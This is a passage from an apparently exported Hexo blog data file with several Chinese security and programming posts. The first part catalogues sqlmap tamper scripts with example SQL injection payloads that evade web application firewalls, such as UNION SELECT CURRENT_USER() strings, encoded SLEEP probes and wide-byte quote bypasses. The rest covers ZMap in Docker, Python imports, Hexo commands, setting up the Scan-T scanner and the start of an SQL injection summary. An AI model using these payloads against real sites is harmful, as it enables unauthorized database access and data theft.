CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() \n   AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa\") \n   　\"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa\"\n\n```\n\n* space2morehash.py\n\n　　作用：空格替换为 #号 以及更多随机字符串 换行符\n\n\n　　Example: \n``` bash\n   Input: 1 AND 9227=9227 \n\n   Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227\n\n```\n\n\n\n* appendnullbyte.py\n\n　作用：在有效负荷结束位置加载零字节字符编码\n　Example: \n``` bash\n('1 AND 1=1') '1 AND 1=1%00' \n\n```\n　　常用于access\n* ifnull2ifisnull.py\n\n　作用：绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’\nExample:\n``` bash\n('IFNULL(1, 2)') 'IF(ISNULL(1),2,1)' \n```\n* space2mssqlblank.py(mssql)\n\n　　作用：空格替换为其它空符号\n\n　　Example: \n``` bash\n Input: SELECT id FROM users * \n Output: SELECT%08id%02FROM%0Fusers\n```\n\n\n\n* base64encode.py\n\n　　作用：用base64编码替换 Example: (\"1' AND SLEEP(5)#\") 'MScgQU5EIFNMRUVQKDUpIw==' Requirement: all\n\n\n* space2mssqlhash.py\n\n　　作用：替换空格\n\n\n　　Example: \n``` bash\n('1 AND 9227=9227') '1%23%0AAND%23%0A9227=9227' \n```\n* modsecurityversioned.py\n\n　　作用：过滤空格，包含完整的查询版本注释\n\n\n　　Example:\n\n``` bash\n('1 AND 2>1--') '1 /*!30874AND 2>1*/--' \n```\n\n* space2mysqlblank.py\n\n　　作用：空格替换其它空白符号(mysql)\n\n　　Example: \n``` bash\n　Input: SELECT id FROM users \n\n　Output: SELECT%0Bid%0BFROM%A0users \n```\n* between.py\n\n　　作用：用between替换大于号（>）\n\n　　Example:\n``` bash\n ('1 AND A > B--') '1 AND A NOT BETWEEN 0 AND B--' \n```\n\n* space2mysqldash.py\n\n　　作用：替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）\n\n注：之前有个mssql的 这个是mysql的\n\n　　Example: \n``` bash\n('1 AND 9227=9227') '1--%0AAND--%0A9227=9227'\n```\n\n\n* multiplespaces.py\n\n　　作用：围绕SQL关键字添加多个空格\n\n　　Example:\n``` bash\n ('1 UNION SELECT foobar') '1 UNION SELECT foobar' \n```\n\n\n\n* ：space2plus.py\n\n　　作用：用+替换空格\n\n　　Example:\n``` bash\n ('SELECT id FROM users') 'SELECT+id+FROM+users' \n ```\n\n* bluecoat.py\n\n　　作用：代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like\n\n　　Example: \n``` bash\n('SELECT id FROM users where id = 1') 'SELECT%09id FROM users where id LIKE 1' \n```\n* nonrecursivereplacement.py\n\n　　双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters\n\n　　Example: \n``` bash\n('1 UNION SELECT 2--') '1 UNIOUNIONN SELESELECTCT 2--' \n```\n* space2randomblank.py\n\n　　作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集\n\n　　Example: \n``` bash\n('SELECT id FROM users') 'SELECT%0Did%0DFROM%0Ausers'\n```\n* sp_password.py\n\n　　作用：追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾\n\n　　Example: \n``` bash\n('1 AND 9227=9227-- ') '1 AND 9227=9227-- sp\\_password' \n```\n* chardoubleencode.py\n\n　　作用: 双url编码(不处理以编码的)\n\n　　Example: \n``` bash\n Input: SELECT FIELD FROM%20TABLE \n\n Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545\n```\n* unionalltounion.py\n\n　　作用：替换UNION ALL SELECT UNION SELECT\n\n　　Example:\n``` bash\n ('-1 UNION ALL SELECT') '-1 UNION SELECT'\n```\n\n* charencode.py\n\n　　作用：url编码\n　　Example:\n``` bash\n   Input: SELECT FIELD FROM%20TABLE\n\n   Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45\n```\n\n* randomcase.py\n\n　　作用：随机大小写 Example:\n``` bash\nInput: INSERT\nOutput: InsERt\n```\n\n\n* unmagicquotes.py\n\n　　作用：宽字符绕过 GPC addslashes\n\n　　Example: \n``` bash\n Input: 1′ AND 1=1 \n\n Output: 1%bf%27 AND 1=1–%20\n```\n* randomcomments.py\n\n　　作用：用/**/分割sql关键字\n\n　　Example:\n``` bash\n‘INSERT’ becomes ‘IN//S//ERT’\n```\n* charunicodeencode.py\n\n　　作用：字符串 unicode 编码\n\n　　Example: \n``` bash\n Input: SELECT FIELD%20FROM TABLE \n\n Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′\n```\n\n\n\n\n* securesphere.py\n\n　　作用：追加特制的字符串\n\n\n　　Example:\n``` bash\n ('1 AND 1=1') \"1 AND 1=1 and '0having'='0having'\" \n```\n\n* versionedmorekeywords.py\n\n　　作用：注释绕过\n\n　　Example: \n``` bash\nInput: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# \n\n Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))# \n```\n* space2comment.py\n　　作用：Replaces space character (‘ ‘) with comments ‘/**/’\n\n　　Example: \n``` bash\n Input: SELECT id FROM users \n\n Output: SELECT//id//FROM/**/users\n```\n\n* halfversionedmorekeywords.py\n\n　　作用：关键字前加注释\n\n　　Example: \n``` bash\n Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa \n\n Output: value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’='QDWa\n```\n\n### 有时发现跑出的数据都是毫无意义的字符\n\n解决方案：\n\n　　a）SQLMAP会提示你加--hex或者--no-cast，有时会有帮助\n　　b）如果你用的是time-based注射，建议增加延时--time-sec等参数，即使你的网速比较好，但是服务器可能遇见各种奇怪环境\n　　c）增加level的数值\n### 暴力猜表\n　　针对access站可以构造common-tables.txt\n### 显示unable to connect to the target url\n\n　　第一个可能是time-out设置的太小，出现问题，再有可能就是WAF直接把请求拦截掉了，因此得不到响应。\n\n有些waf比较友善，过滤后会提示“参数不合法”，但是也有些waf则直接把请求拦下来无提示导致应答超时，这样在测试时会消耗大量的时间等待响应\n\n　　解决方案：减少time-out进行检测，在跑数据时改回time-out\n### 提示possible integer casting detected\n\n　　如果是在手工测试，建议到这里可以停止了，节省时间。\n\n　　如果是在扫描器扫描的盲注，那么到这里坚决无视警告继续下去。\n### 参考文献：\n　　http://drops.wooyun.org/tools/4760\n　　http://drops.wooyun.org/tips/143\n　　http://www.2cto.com/Article/201306/223082.html\n　　http://drops.wooyun.org/tips/5254","slug":"sqlmaptips","published":1,"updated":"2016-02-25T06:18:24.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciyr5277p000t2xhpfbpbadsw"},{"title":"Run Zmap in docker","date":"2017-01-05T05:47:03.000Z","keywords":null,"_content":"<h2 id=\"intro\">前言</h2>最近尝试在Docker环境中安装ZMAP，出现一些问题\n### 总体\n- **情况描述1:**　出现 SIOCGIFADDR: Invalid argument\n- **情况描述2:**　无法发包\n<!-- more -->\n## 问题描述\n\n　　最近因为需要，遂在Docker环境的下Centos，安装ZMAP。安装的时候出现一系列组件没有完全。网上的在Centos里安装ZMAP的方法，已经无法使用。也不能使用\n``` bash\n　　yum install zmap\n```\n类似这样的方法，因此就只能自己乖乖的安装基本组件。\n\n## 安装流程\n　　相关的安装方法可以参考[ZMAP](https://github.com/zmap/zmap)官方的教程。在安装[ZMAP](https://github.com/zmap/zmap)之前还需要安装[JSON-C](https://github.com/json-c/json-c).相关的参考文档，在对应的git都有相应的教程。\n### 需要的环境\n* gcc\n* libtool>=2.2.6b\n* autoconf>=2.64 (autoreconf)\n* automake>=1.10.3\n\n　　在遇到这些库没有的时候，在Google直接搜索对应的组件以及版本，找到对应的RPM包进行安装。\n　　在安装完JSON-C后，安装ZMAP会出现缺少JSON-C组件，这时候就需要自己添加路径。或者安装一个libjson的库。\n\n## 运行问题\n　　在运行ZMAP的时候，会出现如下错误:\n\n``` bash\nzmap:could not detect default network interface(e,g.eth0).Try running as root or setting interface using -i flag\n```\n\n　　这时候通过ifconfig查找对应interface name，然后在运行ZMAP运行的时候添加-i 参数，并附上interface name就行了。\t\t\n　　虽然能运行起来，但是会发现程序无法收发包，通过 tcpdump 抓包发现程序也无法发包，显示错误：\n``` bash\nSIOCGIFADDR: Invalid argument\n```\n通过gdb单步调试，确定报错的位置在send-linux.h文件的如下函数\n``` bash\nif (ioctl(sock, SIOCGIFADDR, &if_ip) < 0) {\n\t\tperror(\"SIOCGIFADDR\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n```\n\n\n然后观察前后文，并没有发现```if_ip```被使用的情况\n因此就注释了这一段，然后重新把源码编译一下，就能够运行了。\n\n然后将问题反馈给ZMAP作者，并修复了这个问题。详细细节见[https://github.com/zmap/zmap/issues/279#issuecomment-270719911](https://github.com/zmap/zmap/issues/279#issuecomment-270719911)\n","source":"_posts/run-zmap-in-docker.md","raw":"---\ntitle: Run Zmap in docker\ndate: 2017-01-05 13:47:03\ntag:\n- Zmap\n- Docker\n- Centos\ncategories:\n- Web安全\nkeywords:\n---\n<h2 id=\"intro\">前言</h2>最近尝试在Docker环境中安装ZMAP，出现一些问题\n### 总体\n- **情况描述1:**　出现 SIOCGIFADDR: Invalid argument\n- **情况描述2:**　无法发包\n<!-- more -->\n## 问题描述\n\n　　最近因为需要，遂在Docker环境的下Centos，安装ZMAP。安装的时候出现一系列组件没有完全。网上的在Centos里安装ZMAP的方法，已经无法使用。也不能使用\n``` bash\n　　yum install zmap\n```\n类似这样的方法，因此就只能自己乖乖的安装基本组件。\n\n## 安装流程\n　　相关的安装方法可以参考[ZMAP](https://github.com/zmap/zmap)官方的教程。在安装[ZMAP](https://github.com/zmap/zmap)之前还需要安装[JSON-C](https://github.com/json-c/json-c).相关的参考文档，在对应的git都有相应的教程。\n### 需要的环境\n* gcc\n* libtool>=2.2.6b\n* autoconf>=2.64 (autoreconf)\n* automake>=1.10.3\n\n　　在遇到这些库没有的时候，在Google直接搜索对应的组件以及版本，找到对应的RPM包进行安装。\n　　在安装完JSON-C后，安装ZMAP会出现缺少JSON-C组件，这时候就需要自己添加路径。或者安装一个libjson的库。\n\n## 运行问题\n　　在运行ZMAP的时候，会出现如下错误:\n\n``` bash\nzmap:could not detect default network interface(e,g.eth0).Try running as root or setting interface using -i flag\n```\n\n　　这时候通过ifconfig查找对应interface name，然后在运行ZMAP运行的时候添加-i 参数，并附上interface name就行了。\t\t\n　　虽然能运行起来，但是会发现程序无法收发包，通过 tcpdump 抓包发现程序也无法发包，显示错误：\n``` bash\nSIOCGIFADDR: Invalid argument\n```\n通过gdb单步调试，确定报错的位置在send-linux.h文件的如下函数\n``` bash\nif (ioctl(sock, SIOCGIFADDR, &if_ip) < 0) {\n\t\tperror(\"SIOCGIFADDR\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n```\n\n\n然后观察前后文，并没有发现```if_ip```被使用的情况\n因此就注释了这一段，然后重新把源码编译一下，就能够运行了。\n\n然后将问题反馈给ZMAP作者，并修复了这个问题。详细细节见[https://github.com/zmap/zmap/issues/279#issuecomment-270719911](https://github.com/zmap/zmap/issues/279#issuecomment-270719911)\n","slug":"run-zmap-in-docker","published":1,"updated":"2017-01-06T02:36:11.352Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciyr5277s000y2xhp6lqa6pse"},{"title":"python 中常见的 import 模块的方法(总结)","date":"2016-01-18T13:23:40.000Z","_content":"<h2 id=\"intro\">前言</h2>在用python进行编程时，经常会使用第三方模块包。这种包我们可以通过 python setup install  进行安装后，通过 import XXX或from XXX import yyy 进行导入。不过如果是自己遍写的依赖包，又不想安装到 python 的相应目录，可以放到本目录里进行import进行调用；为了更清晰的理清程序之间的关系，例如我们会把这种包放到lib目录再调用。\n<!-- more -->\n##  同级目录下的调用\n\n　　程序结构如下：\n\n``` bash\n-- src\n    |-- mod1.py\n    |-- test1.py\n```\n　　若在程序test1.py中导入模块mod1, 则直接使用\n\n``` bash\nimport mod1\n或\nfrom mod1 import *;y\n```\n\n##  调用子目录下的模块\n\n　　程序结构如下：\n\n``` bash\n-- src\n    |-- mod1.py\n    |-- lib\n    |    |-- mod2.py\n    |-- test1.py\n```\n　　这时看到test1.py和lib目录（即mod2.py的父级目录），如果想在程序test1.py中导入模块mod2.py ，可以在lib件夹中建立空文件__init__.py文件(也可以在该文件中自定义输出模块接口)，然后使用：\n\n``` bash\nfrom lib.mod2 import *\n或\nimport lib.mod2.\n```\n\n## 调用上级目录下的文件\n　　程序结构如下：\n\n``` bash\n-- src\n    |-- mod1.py\n    |-- lib\n    |    |-- mod2.py\n    |-- sub\n    |    |-- test2.py\n```\n　　这里想要实现test2.py调用mod1.py和mod2.py ，做法是我们先跳到src目录下面，直接可以调用mod1，然后在lib上当下建一个空文件__init__.py ，就可以像第二步调用子目录下的模块一样，通过import lib.mod2进行调用了。具体代码如下：\n\n``` bash\nimport sys\nsys.path.append(\"..\")\nimport mod1\nimport lib.mod2\n```\n　　这些细碎的知识很琐碎，有时候到很后面的时候，会突然发现，前面有些只是都会忘了。因此就把这些记下来，方便查阅。\n","source":"_posts/python 中常见的 import 模块的方法(总结).md","raw":"---\ntitle: python 中常见的 import 模块的方法(总结)\ndate: 2016-01-18 21:23:40\ncategories:\n- Python\ntag:\n- import\n- Python\n---\n<h2 id=\"intro\">前言</h2>在用python进行编程时，经常会使用第三方模块包。这种包我们可以通过 python setup install  进行安装后，通过 import XXX或from XXX import yyy 进行导入。不过如果是自己遍写的依赖包，又不想安装到 python 的相应目录，可以放到本目录里进行import进行调用；为了更清晰的理清程序之间的关系，例如我们会把这种包放到lib目录再调用。\n<!-- more -->\n##  同级目录下的调用\n\n　　程序结构如下：\n\n``` bash\n-- src\n    |-- mod1.py\n    |-- test1.py\n```\n　　若在程序test1.py中导入模块mod1, 则直接使用\n\n``` bash\nimport mod1\n或\nfrom mod1 import *;y\n```\n\n##  调用子目录下的模块\n\n　　程序结构如下：\n\n``` bash\n-- src\n    |-- mod1.py\n    |-- lib\n    |    |-- mod2.py\n    |-- test1.py\n```\n　　这时看到test1.py和lib目录（即mod2.py的父级目录），如果想在程序test1.py中导入模块mod2.py ，可以在lib件夹中建立空文件__init__.py文件(也可以在该文件中自定义输出模块接口)，然后使用：\n\n``` bash\nfrom lib.mod2 import *\n或\nimport lib.mod2.\n```\n\n## 调用上级目录下的文件\n　　程序结构如下：\n\n``` bash\n-- src\n    |-- mod1.py\n    |-- lib\n    |    |-- mod2.py\n    |-- sub\n    |    |-- test2.py\n```\n　　这里想要实现test2.py调用mod1.py和mod2.py ，做法是我们先跳到src目录下面，直接可以调用mod1，然后在lib上当下建一个空文件__init__.py ，就可以像第二步调用子目录下的模块一样，通过import lib.mod2进行调用了。具体代码如下：\n\n``` bash\nimport sys\nsys.path.append(\"..\")\nimport mod1\nimport lib.mod2\n```\n　　这些细碎的知识很琐碎，有时候到很后面的时候，会突然发现，前面有些只是都会忘了。因此就把这些记下来，方便查阅。\n","slug":"python 中常见的 import 模块的方法(总结)","published":1,"updated":"2016-08-14T12:42:18.852Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciyr5277x00152xhp5uxengef"},{"title":"hexo编写笔记","date":"2016-01-07T06:28:56.000Z","keywords":"测试","_content":"简单的记录hexo的指令.\n\n## 新手入门\n\n### 新建文章\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\n更多信息: [Writing](http://hexo.io/docs/writing.html)\n\n### 运行服务器\n\n``` bash\n$ hexo server\n```\n\n更多信息: [Server](http://hexo.io/docs/server.html)\n\n### 生成静态文件\n\n``` bash\n$ hexo generate\n```\n\n更多信息: [Generating](http://hexo.io/docs/generating.html)\n\n### 部署服务\n\n``` bash\n$ hexo deploy\n```\n\n更多信息: [Deployment](http://hexo.io/docs/deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: hexo编写笔记\ndate: 2016-01-07 14:28:56\ntags: test\ncategories: 草稿箱\nkeywords: 测试\n---\n简单的记录hexo的指令.\n\n## 新手入门\n\n### 新建文章\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\n更多信息: [Writing](http://hexo.io/docs/writing.html)\n\n### 运行服务器\n\n``` bash\n$ hexo server\n```\n\n更多信息: [Server](http://hexo.io/docs/server.html)\n\n### 生成静态文件\n\n``` bash\n$ hexo generate\n```\n\n更多信息: [Generating](http://hexo.io/docs/generating.html)\n\n### 部署服务\n\n``` bash\n$ hexo deploy\n```\n\n更多信息: [Deployment](http://hexo.io/docs/deployment.html)\n","slug":"hello-world","published":1,"updated":"2016-01-07T07:02:38.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciyr52783001b2xhpla5uwjsi"},{"title":"Scan-T简介","date":"2016-01-21T01:25:37.000Z","_content":"<h2 id=\"intro\">前言</h2>看着自己编写的代码没有说明的确不方便别人开发，便写了部分说明在这边。简单的记录该项目的相关说明。\n### 关于Scan-T项目的说明\n- **文件分布:**详细文件分类\n- **功能使用:**大致的功能描述\n- **效果展示:** 初步的界面效果\n- **TODO:** 进一步需要做的事情\n- **其他:** 补充的地方\n<!-- more -->\n\n## 简介\n　　Scan-T是一个网络空间指纹扫描工具，用于记录主机上的端口信息。以分布的方式，方便数据的抓取以及呈现，未来将会添加统计以及总结这些数据潜在的意义（暂时思路比较模糊）。有愿意指点我的，可以提供一点思路，谢谢。\n\n## 整体架构\n　　Scan-T的整体架构为nginx+Django+uwsgi,主体语言为python,抓取信息时,使用线程,进程,协程相互配合方式,检索数据使用ES配合redis,提高检索效率.\n\n### 项目地址\n　　[https://github.com/nanshihui/Scan-T](https://github.com/nanshihui/Scan-T)\n## 效果展示\n\n\n### 首页\n![PS-PNG-main](http://nanshihui.github.io/public/main.png)\n### 检索结果\n![PS-PNG-result](http://nanshihui.github.io/public/result.png)\n### 后台\n![PS-PNG-work](http://nanshihui.github.io/public/work.png)\n### 统计分析页面\n![PS-PNG-analyse](http://nanshihui.github.io/public/analyse.png)\n### 主机位置明细页面\n![PS-PNG-analyse](http://nanshihui.github.io/public/mapshow.png)\n<!--### 移动端-->\n<!--<div>-->\n<!--<img src=\"http://nanshihui.github.io/public/phone.png\" width = \"268\" height = \"480\" alt=\"图片名称\" align=\"center\" />-->\n<!--</div>-->\n## 整体思路\n　　整个项目是一个分布式的形式。如果在单台机子上，就是一个WEB项目，如果在多台机上面，就是一个主从的运行模式，由主机从用户的输入以及定时产生的任务产生数据，自己在处理数据的同时，如果从机有响应任务请求。主机会将一部分的任务发送给从机。待从机执行完任务后，将结果反馈给主机。主机再将结果返回给用户以及数据库里。由于所有的消息都是异步的，所以在实现的时候，大部分都是异步，以任务的形式分发，执行。\n\n## 安装方法\n\n\n### Prepare the environment\n``` bash\napt-get update \napt-get install -y nmap\napt-get install -y libjson-c-dev libjson-c2  libjson0 libjson0-dev\napt-get install -y redis-server zmap libffi-dev libssl-dev python-pip libmysqlclient-dev\napt-get install -y wget unzip\napt-get install mysql-server\n```\n### Get the code\n``` bash\nwget https://github.com/nanshihui/Scan-T/archive/master.zip\nunzip master.zip \ncd Scan-T-master/\n\n```\n### Install package\n``` bash\npip install MySQL-python\npip install BeautifulSoup==3.2.1\npip install beautifulsoup4==4.4.1\npip install Django==1.9\npip install python-nmap==0.5.0.post1\npip install DBUtils==1.1\npip install paramiko==1.16.0\npip install ruamel.ordereddict==0.4.9\npip install scapy==2.3.2\npip install scapy-http==1.7\npip install objgraph==2.0.1\npip install pycrypto==2.6.1\npip install dozer\npip install faulthandler\npip install apscheduler\n\n```\n### Set the mysql config\n* create table\n\n\n``` bash\nmysql -uroot -p -e 'create database datap'\n\n\n```\n\n* change password\n\nchange you sql password both in spidermanage/spidertool/config.py\ntoolforspider/spidermanage/spidermanage/settings.py\n\n* import the data structure\n\n``` bash\nmysql -uroot -p datap -e 'source /toolforspider-master/spidermanage/sqldata/Dump20160331.sql'\n\n\n```\n\n* add your username\n\nadd your username and password in usertable\n### Add css file\n* PATH:/toolforspider-master/spidermanage/common_static/nmaptool/css/bootstrap/ \n\ncreate floder named lib and download css below \n``` bash\nhttp://cine9deabril.com.br/fn/jquery/jquery-ui-1.10.2.custom/css/custom-theme/jquery-ui-1.10.2.custom.css\nhttps://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.css\n\n\n```\n### Add logfile\n\n``` bash\n\nmkdir spidermanage/lib/\ntouch spidermanage/lib/__init__.py\n\n\n```\nadd the following code to spidermanage/lib/logger.py \n\n``` bash\n\n#!/usr/bin/python\n# encoding=utf-8\n\n\nimport logging\n\ndef initLog(logfile, level=2, verbose=False):\n    '''\n    日志记录函数，日志等级默认为2，即INFO级别的日志\n    verbose - 是否屏幕输出，默认False\n    '''\n    logLevel = logging.INFO\n    if level == 0:\n        logLevel = logging.NOTSET\n    elif level == 1:\n        logLevel = logging.DEBUG\n    elif level == 2:\n        logLevel = logging.INFO\n    elif level == 3:\n        logLevel = logging.WARNING\n    elif level == 4:\n        logLevel = logging.ERROR\n    elif level == 5:\n        logLevel = logging.CRITICAL\n    logger = logging.getLogger('pocdect')\n    console = logging.FileHandler(logfile)\n    formatter = logging.Formatter('[%(asctime)s]%(filename)s-%(process)d-%(thread)d-%(lineno)d-%(levelname)8s-\"%(message)s\"','%Y-%m-%d %a %H:%M:%S')\n    console.setFormatter(formatter)\n    logger.addHandler(console)\n    logger.setLevel(logLevel)\n\n    if verbose:\n        console = logging.StreamHandler()\n        console.setLevel(logLevel)  # always debug mode to screen\n        formatter = logging.Formatter('%(name)-8s: %(levelname)-8s %(message)s')\n        console.setFormatter(formatter)\n        logger.addHandler(console)\n\n    return logger\n\n\n\n```\n### Start\n``` bash\npython spidermanage/manage.py runserver 0.0.0.0:80 --insecure\n\n\n```\n\n\n\n\n\n## 使用方法\n  软件不需要用户手动的创建任务便会在后台随机产生任务,并在互联网上抓取,也可以直接创建任务抓取信息.\n　　暂时先这样，未完待续。。。","source":"_posts/ToolForSpider简介.md","raw":"---\ntitle: Scan-T简介\ndate: 2016-01-21 09:25:37\ncategories:\n- Web安全\ntag:\n- 爬虫\n- Zmap\n- Nmap\n- Python\n---\n<h2 id=\"intro\">前言</h2>看着自己编写的代码没有说明的确不方便别人开发，便写了部分说明在这边。简单的记录该项目的相关说明。\n### 关于Scan-T项目的说明\n- **文件分布:**详细文件分类\n- **功能使用:**大致的功能描述\n- **效果展示:** 初步的界面效果\n- **TODO:** 进一步需要做的事情\n- **其他:** 补充的地方\n<!-- more -->\n\n## 简介\n　　Scan-T是一个网络空间指纹扫描工具，用于记录主机上的端口信息。以分布的方式，方便数据的抓取以及呈现，未来将会添加统计以及总结这些数据潜在的意义（暂时思路比较模糊）。有愿意指点我的，可以提供一点思路，谢谢。\n\n## 整体架构\n　　Scan-T的整体架构为nginx+Django+uwsgi,主体语言为python,抓取信息时,使用线程,进程,协程相互配合方式,检索数据使用ES配合redis,提高检索效率.\n\n### 项目地址\n　　[https://github.com/nanshihui/Scan-T](https://github.com/nanshihui/Scan-T)\n## 效果展示\n\n\n### 首页\n![PS-PNG-main](http://nanshihui.github.io/public/main.png)\n### 检索结果\n![PS-PNG-result](http://nanshihui.github.io/public/result.png)\n### 后台\n![PS-PNG-work](http://nanshihui.github.io/public/work.png)\n### 统计分析页面\n![PS-PNG-analyse](http://nanshihui.github.io/public/analyse.png)\n### 主机位置明细页面\n![PS-PNG-analyse](http://nanshihui.github.io/public/mapshow.png)\n<!--### 移动端-->\n<!--<div>-->\n<!--<img src=\"http://nanshihui.github.io/public/phone.png\" width = \"268\" height = \"480\" alt=\"图片名称\" align=\"center\" />-->\n<!--</div>-->\n## 整体思路\n　　整个项目是一个分布式的形式。如果在单台机子上，就是一个WEB项目，如果在多台机上面，就是一个主从的运行模式，由主机从用户的输入以及定时产生的任务产生数据，自己在处理数据的同时，如果从机有响应任务请求。主机会将一部分的任务发送给从机。待从机执行完任务后，将结果反馈给主机。主机再将结果返回给用户以及数据库里。由于所有的消息都是异步的，所以在实现的时候，大部分都是异步，以任务的形式分发，执行。\n\n## 安装方法\n\n\n### Prepare the environment\n``` bash\napt-get update \napt-get install -y nmap\napt-get install -y libjson-c-dev libjson-c2  libjson0 libjson0-dev\napt-get install -y redis-server zmap libffi-dev libssl-dev python-pip libmysqlclient-dev\napt-get install -y wget unzip\napt-get install mysql-server\n```\n### Get the code\n``` bash\nwget https://github.com/nanshihui/Scan-T/archive/master.zip\nunzip master.zip \ncd Scan-T-master/\n\n```\n### Install package\n``` bash\npip install MySQL-python\npip install BeautifulSoup==3.2.1\npip install beautifulsoup4==4.4.1\npip install Django==1.9\npip install python-nmap==0.5.0.post1\npip install DBUtils==1.1\npip install paramiko==1.16.0\npip install ruamel.ordereddict==0.4.9\npip install scapy==2.3.2\npip install scapy-http==1.7\npip install objgraph==2.0.1\npip install pycrypto==2.6.1\npip install dozer\npip install faulthandler\npip install apscheduler\n\n```\n### Set the mysql config\n* create table\n\n\n``` bash\nmysql -uroot -p -e 'create database datap'\n\n\n```\n\n* change password\n\nchange you sql password both in spidermanage/spidertool/config.py\ntoolforspider/spidermanage/spidermanage/settings.py\n\n* import the data structure\n\n``` bash\nmysql -uroot -p datap -e 'source /toolforspider-master/spidermanage/sqldata/Dump20160331.sql'\n\n\n```\n\n* add your username\n\nadd your username and password in usertable\n### Add css file\n* PATH:/toolforspider-master/spidermanage/common_static/nmaptool/css/bootstrap/ \n\ncreate floder named lib and download css below \n``` bash\nhttp://cine9deabril.com.br/fn/jquery/jquery-ui-1.10.2.custom/css/custom-theme/jquery-ui-1.10.2.custom.css\nhttps://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.css\n\n\n```\n### Add logfile\n\n``` bash\n\nmkdir spidermanage/lib/\ntouch spidermanage/lib/__init__.py\n\n\n```\nadd the following code to spidermanage/lib/logger.py \n\n``` bash\n\n#!/usr/bin/python\n# encoding=utf-8\n\n\nimport logging\n\ndef initLog(logfile, level=2, verbose=False):\n    '''\n    日志记录函数，日志等级默认为2，即INFO级别的日志\n    verbose - 是否屏幕输出，默认False\n    '''\n    logLevel = logging.INFO\n    if level == 0:\n        logLevel = logging.NOTSET\n    elif level == 1:\n        logLevel = logging.DEBUG\n    elif level == 2:\n        logLevel = logging.INFO\n    elif level == 3:\n        logLevel = logging.WARNING\n    elif level == 4:\n        logLevel = logging.ERROR\n    elif level == 5:\n        logLevel = logging.CRITICAL\n    logger = logging.getLogger('pocdect')\n    console = logging.FileHandler(logfile)\n    formatter = logging.Formatter('[%(asctime)s]%(filename)s-%(process)d-%(thread)d-%(lineno)d-%(levelname)8s-\"%(message)s\"','%Y-%m-%d %a %H:%M:%S')\n    console.setFormatter(formatter)\n    logger.addHandler(console)\n    logger.setLevel(logLevel)\n\n    if verbose:\n        console = logging.StreamHandler()\n        console.setLevel(logLevel)  # always debug mode to screen\n        formatter = logging.Formatter('%(name)-8s: %(levelname)-8s %(message)s')\n        console.setFormatter(formatter)\n        logger.addHandler(console)\n\n    return logger\n\n\n\n```\n### Start\n``` bash\npython spidermanage/manage.py runserver 0.0.0.0:80 --insecure\n\n\n```\n\n\n\n\n\n## 使用方法\n  软件不需要用户手动的创建任务便会在后台随机产生任务,并在互联网上抓取,也可以直接创建任务抓取信息.\n　　暂时先这样，未完待续。。。","slug":"ToolForSpider简介","published":1,"updated":"2016-09-07T05:12:07.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciyr52786001g2xhpy8dr49wv"},{"title":"SQL注入总结（一）","date":"2016-01-19T15:26:39.000Z","_content":"<h2 id=\"intro\">前言</h2>习惯sqlmap方便的的同时，会不知不觉依赖上，差点忘了根本，遂总结了一下，提醒自己\n\n### 常见的SQL注入形式\n- **读取数据库内容常用方式:**　information_schema，mysql.user\n- **有回显的函数错误提示:** 有SQL错误显示；\n- **无回显的函数错误提示:** 盲注，即没有有SQL错误显示；\n- **加密形式:** SQL加密执行显示;\n- **其他形式:** 宽字节注入等;\n- **预防措施:** 如何避免；\n- **常用函数:** sql自带的函数；\n- **其他:** 补充的地方；\n\n<!-- more -->\n## 读取数据库内容常用方式\n　　数据库都会有内置的表，里面已经包含了所有建表的信息。以MySQL为例。在５版本以上的数据库使用如下语句，就可以直接获得数据库的表的信息。\n### MySQL\n　　比如在MySQL下有\n``` bash\n    select group_concat(distinct table_name) from information_schema.columns 